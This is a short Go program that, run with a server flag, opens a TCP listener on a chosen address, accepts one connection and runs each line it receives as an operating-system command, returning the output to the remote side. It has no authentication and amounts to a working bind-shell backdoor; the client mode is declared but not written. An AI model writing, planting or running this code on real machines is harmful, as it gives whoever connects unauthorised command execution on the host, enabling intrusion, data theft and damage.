package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

func main() {
	var ip = flag.String("ip", "", "IP address to use")
	var port = flag.Int("port", 0, "port to use")
	var isServer = flag.Bool("server", false, "act like a server, client otherwise")
	flag.Parse()

	if *isServer == true {
		err := listen("tcp", fmt.Sprintf("%s:%d", *ip, *port))
		if err != nil {
			fmt.Printf("Failed to host a server on %s:%d\n", *ip, *port)
			os.Exit(1)
		}
	}
}

func listen(protocol string, host string) error {
	ln, err := net.Listen(protocol, host)
	if err != nil {
		return err
	}

	fmt.Printf("Listening on %s..\n", host)

	conn, err := ln.Accept()
	if err != nil {
		return err
	}
	fmt.Printf("Connection accepted from %s!\n", conn.RemoteAddr().String())
	fmt.Fprintf(conn, "You have successfully connected to %s!\n", conn.LocalAddr().String())
	err = reverseLoop(conn)
	if err != nil {
		fmt.Println(err)
	}
	return nil
}

func reverseLoop(conn net.Conn) error {
	for {
		msg, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			return err
		}
		command := strings.Split(strings.Trim(msg, "\n"), " ")
		cmd := exec.Command(command[0], command[1:]...)

		var out bytes.Buffer
		cmd.Stdout = &out
		err = cmd.Run()
		if err != nil {
			return err
		}
		fmt.Fprintf(conn, out.String())
	}
}
